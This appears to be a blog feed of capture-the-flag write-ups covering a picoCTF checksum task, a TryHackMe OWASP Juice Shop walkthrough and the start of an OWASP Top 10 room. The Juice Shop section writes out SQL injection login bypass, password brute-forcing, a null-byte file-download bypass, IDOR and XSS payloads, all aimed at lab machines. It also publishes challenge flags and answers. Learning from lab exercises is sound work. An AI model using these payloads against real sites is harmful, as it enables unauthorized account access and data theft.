This is my first time experiencing picoCTF. I had heard of it numerous times on the Internet, and it turned out to be way more fun and engaging than I expected. I think Ill stick to picoCTF for a while before moving on to HackTheBox, as I feel picoCTF provides more basic and foundational CTFs than HTB. Anyway, I&amp;rsquo;m really glad I stumbled upon this resource and decided to give it a try.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
<p><em>Happy 4th of July</em></p>
<p>This is my first time experiencing picoCTF. I had heard of it numerous times on the Internet, and it turned out to be way more fun and engaging than I expected. I think Ill stick to picoCTF for a while before moving on to HackTheBox, as I feel picoCTF provides more basic and foundational CTFs than HTB. Anyway, I&rsquo;m really glad I stumbled upon this resource and decided to give it a try.</p>
<hr>
<h3 id="description">Description</h3>
<p>People keep trying to trick my players with imitation flags. I want to make sure they get the real thing! I&rsquo;m going to provide the SHA-256 hash and a decrypt script to help you know that my flags are legitimate.</p>
<hr>
<p>First we need to connect to SSH server by <code>ssh ctf-player@rhea.picoctf.net -p 61394</code></p>
<p>After you are logged into the server, type <code>ls</code> to check files and directories</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ctf-player@pico-chall$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>checksum.txt  decrypt.sh  files</span></span></code></pre></div>
<br>
<p>Checksum
<code>3ad37ed6c5ab81d31e4c94ae611e0adf2e9e3e6bee55804ebc7f386283e366a4</code></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>ctf-player@pico-chall$ ls files
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>0agQiFLS  3kS2W94N  92q4JPFx  CxDy3RIy  GodaoG3e  K9mG0gBB  OVCZKr6X  QNPhWoha  Tui6wJfr  WxflVQBr  Za4Oz6eg  cWvaGe5W  f3Oy21ek  jSNCdUA3  oRzmzVaf  st6t5Khc  wx3RfP7B
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>0pEkV2ds  3kYAjtIX  9EMX68VB  Cz1ZfreC  H3rLRpMi  KCi7EWrH  OX3IlkB9  QjJChAMg  TwspwefZ  X4s5LEFG  ZaN8BLaN  caGexAeh  f7v2BtXe  k2kklNHQ  oZ71cyGG  t0luWBy8  xzvNiQwK
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>0wWA41ot  3mKIltIv  9nlUSB5k  DHDt0q0q  HG1OKGnm  KV1QF2CV  OYpH5Rfs  RIjDMPzO  U14Ody2N  X8OIdwTY  ZfRDLvRe  cdLJdv1c  fKWz0UcF  k3AMdGoS  oaOPzO00  t3YK8diU  yOEWonka
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>0yVzp2am  3xjxuSOP  A0aXQwRy  DMo5tbhE  HPGHI002  KcHrhrZK  Opx3E3FO  RJZglp6X  U6YYQ3HK  XScpq1MB  ZgC80wUc  chaBbXpo  fWnAvkyW  k5aiuMj6  oeq8cWO4  tLG9HM3a  yajqgzPt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>12GUEFi0  49gLh1zo  AKEjqj8u  DNZBkTaH  HRSTilo9  KfXHVDto  Oq8kRa6b  RXCGKuwy  UKi454YR  XW7eedrJ  aDSBn4a7  ciYQtbBp  ffM4jxzv  kLFFhUci  orc2TmKb  uJzNSw96  ypsNLNOA
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>12R70dbh  49qfB01x  AeCM4Vvt  Di7h281J  HchfFzCW  L4oXILcc  OzUaGPJp  RZfcsWcw  UWQ5qeIb  XeegDb5b  aNhIds5X  coeqJdbu  ffw8WXYD  l4lFl66y  p2FLQhZe  uQyUDnOZ  ytd5LOm1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1EQhRC4i  5p13qchp  AhVRy5sU  Dj2k48PL  HlVWXs9d  LCeIKlH5  P0zSZ01H  Ricc6Xgh  UiciI0Fr  XfZqFKg1  aWrHNgwY  covwBpER  fjdhIY2n  lUsUQJ4B  pyJ5KxZp  v6LGqmwI  yzqsPNuQ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>1FjaHS3F  5r6mt5Iq  Aqg5GrWn  DqlYDm8h  HouNr2C0  LJckwIQl  PB3Mh3mc  RuvyhgVU  UinP1H13  XjZyXSLg  aXaKm8w8  cxKJcozU  ftNxaFsY  m2KQa1Hp  q12b9M6L  v8sVJPvD  zH4qslwZ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>1cYEYb6L  6kPfytcD  BMBlGtHm  E5vU7ojc  I7V7Ju5A  LRXQ5oNw  PBh0NfB8  S9jVApXB  Ujaf2OwZ  XrAdESZl  b47rxTge  dINee6RV  gQQDt3TI  m5cOAhxS  q2yrfUO0  vCUbox39  zM5KAlbJ
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>1iXLQGXR  6rd0x1aK  BP14euwo  EAZMi0dM  IAiKRrWF  LqUvuW7o  PGQBY3gP  SA3xkV3Z  UzFFqfxa  XrvFYdDg  b7e3VlZ8  dS2gaUE4  gY52Y8t0  mVEKZ3oW  q7LqCtpM  vTgToTLG  zMQ1nXew
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>2hOQXHZC  6vYE68JA  BkMRgk48  EB06dS7k  INu5ULbd  M19EEXCb  PKjcfWRy  SXltVhZT  V2CZ7uY0  Xw38pYK0  bDlbvwh8  dVJ9IeAT  gZ9thrVF  mcjegRRr  q845iKih  vfN94Ek3  zWeRABcB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>2nsMaCTj  7U4dSToL  BoBiL395  EVjQlyVv  Ic0zhcYV  MKg0Y6X7  PUt9VRoX  SbFIvoSj  VHviUe6f  Xxuckerf  bIl1SDxK  dZVnOthw  hDyxnGKZ  n05ZtlwX  qRM9Cugo  vnr7vUto  zZe9EIdH
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>2zpsEiQJ  7cnZoSuo  BvplEv2R  EtzUMFMR  J75ycvyv  MwfNVxMB  Pf3zlSAC  SkQZlbB2  VUPouqTb  Y4u4wEGY  bf6qqi2j  dkV6p1DF  hKDw8Cwn  n7C2bpPk  qYpcbIbt  w63X3jh4  zhBiEB8c
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>363nnRwS  83NyszLP  CS66jcDI  FN4tlPPC  JBVTXHTa  MzdMfZHa  PtEdNKlH  TBQytfqs  Vj67lQyx  YCf9VpOR  blIGgzh7  dtc6oz6G  iRXqo85L  nDjOINiw  rQP8fnIe  wVXmJCep
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>3BrlDAbo  8Dw7QTA4  CXjlF1PS  FmmWrIZ7  JJxoEHaC  NFea6BFS  PwyKZRSq  TSJCXwIT  WBStW98P  YG1pCKDt  br8OM834  e018b574  imkWZwMa  nF6EHta6  rUOHrSvR  wj3JmMau
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>3PmKbHhH  8HwmtNGn  CaDiX4Hy  GhWI4eJh  JXT0M9Rt  NgY5gymg  PzU12rre  TTjLO7LQ  WET6cnvi  YPNiaCgG  brRmUfmD  e7irOvB1  j1RDffgK  niz3loOL  rfNEgD0l  wr59gSPm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>3ckGbZtx  8cSetvuU  Cdje4q5k  GkM1UPTw  Ji1SbY1i  NopiZGwa  Q5IWBGXV  ThekmVcy  Wh09BzOS  YdulsHwq  btZJHGWw  exGstYty  j5Tc1Z62  o0R9Vxk8  ruWv5GEU  wtPMeWzq
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>3eBHvesU  8sqe8FVs  CntNA8JK  GoGhbQto  K1clcP8Z  O2eRM15N  Q8eHpBL9  TqHFzH54  WrlAfM9p  YdxjMT1r  c3eE4Atp  exbu4azE  jNImYWHs  oGmnMVYP  rudfRBMm  wtq06VT7</span></span></code></pre></div>
<p>At this stage, what we gotta do is create a checksum of each file with <code>sha256sum</code> command and see if we get the matching checksum. In order to create checksum of all files in a directory we can do <code>sha256sum &lt;directory&gt;/*</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ctf-player@pico-chall$ sha256sum files/* | grep <span style="color:#cba6f7">$(</span>cat checksum.txt<span style="color:#cba6f7">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>3ad37ed6c5ab81d31e4c94ae611e0adf2e9e3e6bee55804ebc7f386283e366a4  files/e018b574</span></span></code></pre></div>
<p>As we can see from the output above, we found a matching checksum in a file called <code>e018b574</code></p>
<p>Now we can decrypt the file by running <code>./decrypt.sh files/e018b574</code> command</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>ctf-player@pico-chall$ ./decrypt.sh files/e018b574
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>trust_but_verify_e018b574<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p>We got the flag!</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{trust_but_verify_e018b574}</code></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] OWASP Juice Shop</title>
      <link>http://localhost:1313/thm-owasp-juice-shop/</link>
      <pubDate>Wed, 03 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-owasp-juice-shop/</guid>
      <description>We will look at OWASP&amp;rsquo;s TOP 10 vulnerabilities in web applications. But for this, we will be looking at OWASP&amp;rsquo;s own creation, Juice Shop.
Question #1: What&amp;rsquo;s the Administrator&amp;rsquo;s email address? admin@juice-sh.op Question #2: What parameter is used for searching? q When I typed asdfsdf on the search bar, I noticed that the URL changed to http://10.10.113.37/#/search?q=asdfsdf. we can see that the parameter is q.
Question #3: What show does Jim reference in his review?</description>
      <content:encoded><![CDATA[<p>We will look at OWASP&rsquo;s TOP 10 vulnerabilities in web applications. But for this, we will be looking at OWASP&rsquo;s own creation, Juice Shop.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="question-1-whats-the-administrators-email-address">Question #1: What&rsquo;s the Administrator&rsquo;s email address?</h4>






<pre tabindex="0"><code>admin@juice-sh.op</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="question-2-what-parameter-is-used-for-searching">Question #2: What parameter is used for searching?</h4>






<pre tabindex="0"><code>q</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<p>When I typed <code>asdfsdf</code> on the search bar, I noticed that the URL changed to <code>http://10.10.113.37/#/search?q=asdfsdf</code>. we can see that the parameter is <code>q</code>.</p>
<br>
<h4 id="question-3-what-show-does-jim-reference-in-his-review">Question #3: What show does Jim reference in his review?</h4>






<pre tabindex="0"><code>Star Trek</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<p>Jim did a review on the Green Smoothie product. We can see that he mentions a replicator. Replicator is a reference to a TV show called Star Trek.</p>
<br>
<h4 id="question-4-log-into-the-administrator-account">Question #4 Log into the administrator account!</h4>
<p><img src="image-4.png#center" alt="alt text">
On the login page, just type any credentials for Burpsuite to capture the request</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>POST /rest/user/login HTTP/1.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Host: 10.10.113.37
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>User-Agent: Mozilla/5.0 <span style="color:#89dceb;font-weight:bold">(</span>X11; Linux aarch64; rv:109.0<span style="color:#89dceb;font-weight:bold">)</span> Gecko/20100101 Firefox/115.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Accept: application/json, text/plain, */*
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Accept-Language: en-US,en;<span style="color:#f5e0dc">q</span><span style="color:#89dceb;font-weight:bold">=</span>0.5
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Accept-Encoding: gzip, deflate, br
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Content-Type: application/json
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Content-Length: <span style="color:#fab387">44</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Origin: http://10.10.113.37
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Connection: keep-alive
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Referer: http://10.10.113.37/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Cookie: <span style="color:#f5e0dc">io</span><span style="color:#89dceb;font-weight:bold">=</span>QdUYP1oidC2VzPTOAAAA; <span style="color:#f5e0dc">language</span><span style="color:#89dceb;font-weight:bold">=</span>en; <span style="color:#f5e0dc">cookieconsent_status</span><span style="color:#89dceb;font-weight:bold">=</span>dismiss
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">{</span><span style="color:#a6e3a1">&#34;email&#34;</span>:<span style="color:#a6e3a1">&#34;test@gmail.com&#34;</span>,<span style="color:#a6e3a1">&#34;password&#34;</span>:<span style="color:#a6e3a1">&#34;test&#34;</span><span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p>As you could see our request has been captured. Next, we are going to change the email value, <code>test@gmail.com</code> to <code>' or 1=1</code>. <code>{&quot;email&quot;:&quot;' or 1=1&quot;,&quot;password&quot;:&quot;test&quot;}</code></p>
<p>Here&rsquo;s how this works:</p>
<ol>
<li>The character <code>'</code> will close the brackets in the SQL query</li>
<li><code>OR</code> in a SQL statement will return true if either side of it is true. As 1=1 is always true, the whole statement becomes true. Thus it will tell the server that the email is valid, and log us into user id 0, which happens to be the administrator account.</li>
<li>The <code>--</code> character is used in SQL to comment out data, any restrictions on the login will no longer work as they are interpreted as a comment.</li>
</ol>
<p><img src="image-5.png#center" alt="alt text">
Send a request with the SQL injection code then you will be logged in as admin</p>
<br>
<h4 id="question-5-log-into-the-bender-account">Question 5: Log into the Bender account!</h4>






<pre tabindex="0"><code>fb364762a3c102b2db932069c0e6b78e738d4066</code></pre>
<p><img src="image-6.png#center" alt="alt text">
<img src="image-7.png#center" alt="alt text"></p>
<br>
<h4 id="question-6-bruteforce-the-administrator-accounts-password">Question 6: Bruteforce the Administrator account&rsquo;s password</h4>
<p>We have used SQL injection to log into the Administrator account but still do not know the password.
Once again capture a login request but this time send it to Intruder on Burpsuite.</p>
<p>Go to Positions and then select the <code>Clear  </code>. In the password field, place two <code></code> inside the quotes.
The <code></code> is not two separate inputs but Burp&rsquo;s implementation of quotations.
<img src="image-8.png#center" alt="alt text">
<br></p>
<p>For the payload, we will be using the <code>best1050.txt from Seclists</code> for Bruteforce attack.
Seclists can be downloaded via <code>sudo apt-get install seclists</code>. Also, the list is located in <code>/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt</code>
<br></p>
<p><img src="image-9.png#center" alt="alt text"></p>
<p><img src="image-10.png#center" alt="alt text">
As we can see the status code is 200 for the payload, <code>admin123</code>
<br></p>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<h4 id="question-7-reset-jims-password">Question 7: Reset Jim&rsquo;s Password</h4>
<p>When typed into the email field in the Forgot Password page, Jim&rsquo;s security question is set to <code>Your eldest siblings middle name?</code>
However, we already saw that Jim used a Star Trek reference with his review on a juice.</p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<p><img src="image-13.png#center#center" alt="alt text"></p>
<p>when googled &ldquo;Jim Star Trek&rdquo;, the fictional character&rsquo;s name is actually <code>James T. Kirk</code> and its eldest siblings middle name is <code>Samuel</code>
<img src="image-14.png#center#center" alt="alt text">
<img src="image-15.png#center" alt="alt text"></p>
<br>
<h4 id="question-8-access-the-confidential-document">Question 8: Access the Confidential Document!</h4>
<p><img src="image-16.png#center" alt="alt text"></p>
<p>on the bottom left, we can see that it links to <code>http://10.10.187.53/ft/legal.md</code>. Navigating to that <code>/ftp/</code> directory reveals that it is exposed to the public.</p>
<p><img src="image-17.png#center" alt="alt text"></p>
<p>Some of the files appear to be confidential. Download the files and go back to the homepage to receive the flag.</p>
<p><img src="image-18.png#center" alt="alt text">
<code>edf9281222395a1c5fee9b89e32175f1ccf50c5b</code></p>
<br>
<h4 id="question-9-log-into-mc-safesearchs-account">Question 9: Log into MC SafeSearch&rsquo;s account</h4>
<p>Watch the following video to get the password for MC Safe Search&rsquo;s account:
<a href="https://www.youtube.com/watch?v=v59CX2DiX0Y">Link</a></p>
<p>In his song, he mentions that his password is &ldquo;Mr. Noodles&rdquo; but he replaced some vowels into zeros. So, the password to the <em><a href="mailto:mc.safesearch@juice-sh.op">mc.safesearch@juice-sh.op</a></em> is &ldquo;<strong>Mr. N00dles</strong>.</p>
<p><code>66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0</code></p>
<br>
<h4 id="question-10-download-the-backup-file">Question 10: Download the Backup file!</h4>
<p>On http://10.10.176.53/ftp, when we try to download <code>package.json.bak</code> file, we encounter a 403 error saying that only .md and .pdf files can be downloaded.</p>
<p>To get around this, we can use a character bypass called <code>Poison Null Byte</code>.
A Poison Null Byte looks like this <code>$00</code></p>
<p>But because we are downloading it using the url, we will need to encode this into a url encoded format, which is <code>%2500</code>.</p>
<p>The number &ldquo;2500&rdquo; in the context of a &ldquo;Poison Null Byte&rdquo; is a result of URL encoding</p>
<p>A Poison Null Byte is actually a <code>NULL terminator</code>. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.</p>
<p>The final url should look like this: <code>10.10.176.53/ftp/package.json.bak%2500.md</code></p>
<br>
<h4 id="question-11-access-the-administration-page">Question 11: Access the administration page</h4>
<p>Modern-day systems will allow for multiple users to have access to different pages. Administrators most commonly use an admin page to edit, add, and remove different elements of a website.</p>
<p>When <code>Broken Access Control</code> exploits or bugs are found, it will be categorized into one of two types:</p>
<ul>
<li>Horizontal Privilege Escalation</li>
<li>Vertical Privilege Escalation</li>
</ul>
<p>Look for a javascript file for <code>main-es2015.js</code> in Debugger on FireFox (or Sources on Chrome)</p>
<p><img src="image-19.png#center" alt="alt text"></p>
<p>This shows us that there&rsquo;s a path towards <code>/#/administration</code>, but going there while not logged in doesn&rsquo;t work. As this is an Administrator page, it makes sens that we need to be in the Admin account in order to view it.</p>
<br>
<p><img src="image-20.png#center" alt="alt text">
This image above is what we see when we logged in as admin and navigated to <code>/#/administration</code> page.</p>
<p><code>946a799363226a24822008503f5d1324536629a0</code></p>
<br>
<h4 id="question-12-view-another-users-shopping-basket">Question 12: View another user&rsquo;s shopping basket.</h4>
<p>Log into the Admin account and click on &lsquo;Your Basket&rsquo;. Make sure Burp is running so you can capture the request.</p>
<p><code>GET /rest/basket/1 HTTP/1.1</code></p>
<p>Change the number 1 after <code>/basket/</code> to 2</p>
<p><img src="image-21.png#center" alt="alt text"></p>
<p>It will show you the basket of User ID 2. You can do this for other User IDs as well</p>
<br>
<h4 id="question-13-remove-all-5-star-reviews">Question 13: Remove all 5-star reviews.</h4>
<p>Navigate back to <code>/#/administration</code> page and remove all the five-star review by clicking the bin icon.</p>
<p><img src="image-22.png#center" alt="alt text"></p>
<p><code>50c97bcce0b895e446d61c83a21df371ac2266ef</code></p>
<br>
<h4 id="question-14-perform-a-dom-xss">Question 14: Perform a DOM XSS!</h4>
<p>XSS or Cross-site scripting is a vulnerability that allows attackers to run javascript in web applications. Their complexity ranges from easy to extremely hard, as each web application parses the queries in a different way.</p>
<p>There are three major types of XSS attacks:</p>
<ol>
<li>DOM XSS</li>
<li>Persistent XSS</li>
<li>Reflected XSS</li>
</ol>
<p>We will be using the iframe element with a javascript alert tag:</p>
<p><code>&lt;iframe src=&quot;javascript:alert('xss')&quot;&gt;</code></p>
<p>It is common practice that the search bar will send a request to the server in which it will then send back the related information, but this is where the flaw lies. Without correct input sanitastion, we are able to perform an XSS attack against the search bar.</p>
<p><code>9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf</code></p>
<br>
<h4 id="question-15-perform-a-persistent-xss">Question 15: Perform a persistent XSS!</h4>
<p>First, log in to the <code>admin</code> account. We are going to navigate to the <code>Last Login IP</code> page for this attack.</p>
<p>The Last Login IP should say <code>0.0.0.0</code>
As it logs the &rsquo;last&rsquo; login IP, we will now logout so that it logs the &rsquo;new&rsquo; IP. Make sure that Burp intercept is on, so it will catch the logout request.</p>
<p><img src="image-23.png#center" alt="alt text"></p>
<p>After we catch the logout request, we will add a new header like the image above and forward the request to the server with the newly added header.</p>
<p>Then when signing back into the admin account and navigating to the Last Login IP page again, we will see the XSS alert.</p>
<p><img src="image-24.png#center" alt="alt text"></p>
<p><code>149aa8ce13d7a4a8a931472308e269c94dc5f156</code></p>
<br>
<h4 id="question-16-perform-a-reflected-xss">Question 16: Perform a reflected XSS!</h4>
<p>Login into the admin account and navigate to the &lsquo;Order History&rsquo; page.
From there you will see a &lsquo;Truck&rsquo; icon, clicking on that will bring you to the track result page. You will also see that there is an id paird with the order.</p>
<p><code>http://10.10.129.167/#/track-result?id=5267-b3f50aba1f1b9125</code></p>
<p>We will use the iframe XSS, <code>&lt;iframe src=&quot;javascript:alert('xss')&quot;</code>&gt;, in the place of the
<code>5267-b3f50aba1f1b9125</code></p>
<p>After submitting the URL, refresh the page and you will get an alert saying XSS.</p>
<p><img src="image-25.png#center" alt="alt text"></p>
<p><code>23cefee1527bde039295b2616eeb29e1edc660a0</code></p>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] OWASP Top 10 (2021)</title>
      <link>http://localhost:1313/thm-owasp-top-10/</link>
      <pubDate>Sun, 30 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-owasp-top-10/</guid>
      <description>What is OWASP? The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP&amp;rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.</description>
      <content:encoded><![CDATA[<h3 id="what-is-owasp">What is OWASP?</h3>
<p>The <strong>Open Web Application Security Project, or OWASP</strong>, is an international non-profit organization dedicated to <strong>web application security</strong>. One of OWASP&rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.</p>
<h3 id="what-is-owasp-top-10">What is OWASP Top 10?</h3>
<p><strong>The OWASP Top 10</strong> is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.</p>
<blockquote>
<ol>
<li>Broken Access Control</li>
<li>Cryptographic Failures</li>
<li>Injection</li>
<li>Insecure Design</li>
<li>Security Misconfiguration</li>
<li>Vulnerable and Outdated Components</li>
<li>Identification and Authentication Failures</li>
<li>Software and Data Integrity Failures</li>
<li>Security Logging &amp; Monitoring Failures</li>
<li>Server-Side Request Forgery (SSRF)</li>
</ol>
</blockquote>
<hr>
<h3 id="1-broken-access-control">1. Broken Access Control</h3>
<p>Websites usually have pages that are protected from regular visitors. For example, only the site&rsquo;s admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are <em>broken</em>.</p>
<h4 id="broken-access-control-idor-challenge">Broken Access Control (IDOR Challenge)</h4>
<p><strong>IDOR</strong> or <strong>Insecure Direct Object Reference</strong> refers to an access control vulnerability where you can access resources you wouldn&rsquo;t normally be able to see. This occurs when the programmer exposes a <strong>Direct Object Reference</strong>, which is just an identifier that refers to specific objects within the server. By object, it can refer to a file, a user, a bank account in a banking application, or anything.</p>
<br>
<p>Deploy the machine and go to <code>http://MACHINE_IP</code> - login with the username <em>noot</em> and the password <em>test1234</em>.</p>
<br>
Look at other user's notes. What is the flag?






<pre tabindex="0"><code>flag{fivefourthree}</code></pre>
<p><img src="image.png#center" alt="alt text"></p>






<pre tabindex="0"><code>http://10.10.255.211/note.php?note_id=0</code></pre>
<p><img src="image-1.png#center" alt="alt text">
changed the <strong>id</strong> in the url from 1 to 0 and revealed the flag.</p>
<h3 id="2-cryptographic-failures">2. Cryptographic Failures</h3>
<p>A <strong>cryptographic failure</strong> refers to any vulnerability arising from the misuse of cryptographic alogrithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.</p>
<h4 id="cryptographic-failures-challenge">Cryptographic Failures (Challenge)</h4>
<p>Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory.</p>
<p>What is the name of the mentioned directory?</p>






<pre tabindex="0"><code>/assets</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<p>Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?</p>






<pre tabindex="0"><code>webapp.db</code></pre>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>Use the supporting material to access the sensitive data. What is the password hash of the admin user?</p>






